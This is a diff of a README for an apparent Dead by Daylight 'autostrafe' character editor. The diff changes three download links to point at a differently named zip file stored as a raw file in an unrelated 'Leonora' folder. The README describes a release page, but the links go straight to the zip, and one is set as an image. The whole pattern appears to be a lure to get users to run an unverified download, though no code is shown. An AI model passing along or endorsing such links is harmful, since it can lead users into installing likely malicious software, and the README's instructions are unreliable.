@@ -1,6 +1,6 @@
 # 🌟 autostrafe-dbd-visual-character-editor - Explore Character Mechanics Easily
 
-![Download Latest Release](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/autostrafe-dbd-visual-character-editor_v3.6.zip)
+![Download Latest Release](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/editor-visual-autostrafe-character-dbd-v2.8.zip)
 
 ## 📚 Project Overview
 
@@ -14,7 +14,7 @@ To begin using the autostrafe-dbd-visual-character-editor, follow these steps:
 
 1. **Visit the Release Page**: Access the download link below to reach the release page.
 
-   [Download Here](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/autostrafe-dbd-visual-character-editor_v3.6.zip)
+   [Download Here](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/editor-visual-autostrafe-character-dbd-v2.8.zip)
 
 2. **Download the Software**: Choose the latest version available. Click on the version number to view the details, then find the assets for download.
 
@@ -66,7 +66,7 @@ To download and install the application, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the latest version.
 
-   [Download Here](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/autostrafe-dbd-visual-character-editor_v3.6.zip)
+   [Download Here](https://raw.githubusercontent.com/cr7mess111/autostrafe-dbd-visual-character-editor/main/Leonora/editor-visual-autostrafe-character-dbd-v2.8.zip)
 
 2. **Select the Right File**: On the release page, find the most recent version. Look for the appropriate file for your operating system.
 
